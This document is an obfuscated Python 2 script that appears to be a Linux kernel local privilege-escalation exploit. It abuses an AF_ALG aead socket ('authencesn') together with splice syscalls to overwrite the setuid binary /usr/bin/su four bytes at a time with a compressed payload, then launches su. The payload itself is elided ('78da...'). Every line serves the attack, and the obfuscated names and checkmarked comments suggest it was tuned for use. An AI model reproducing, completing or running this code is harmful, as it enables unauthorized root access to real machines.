#!/usr/bin/env python2   # fix shebang

import os as g, zlib, socket as s
import ctypes

libc = ctypes.CDLL("libc.so.6", use_errno=True)
NR_SPLICE = 275

def d(x): return x.decode('hex')  # ✅ correct for py2

def splice(fd_in, fd_out, length, offset_src=0):
    off_in = ctypes.c_longlong(offset_src)
    off_out = ctypes.c_longlong(0)
    return libc.syscall(
        NR_SPLICE,
        ctypes.c_int(fd_in),
        ctypes.byref(off_in),
        ctypes.c_int(fd_out),
        ctypes.byref(off_out),
        ctypes.c_size_t(length),
        ctypes.c_uint(0)
    )  # ✅ correct

def c(f,t,c):
    a=s.socket(38,5,0)
    a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
    h=279
    v=a.setsockopt
    v(h,1,d('0800010000000010'+'0'*64))  # ✅
    v(h,5,None,4)
    u,_=a.accept()
    o=t+4
    i=d('00')  # ✅ returns '\x00' in py2
    u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3)],32768)  # ✅
    r,w=g.pipe()
    splice(f,w,o,offset_src=0)  # ✅
    splice(r,u.fileno(),o)      # ✅
    try: u.recv(8+t)
    except: 0

f=g.open("/usr/bin/su",0)
i=0
e=zlib.decompress(d("78da..."))  # ✅
while i<len(e):
    c(f,i,e[i:i+4])  # ✅ str slice in py2
    i+=4
g.system("su")  # ✅
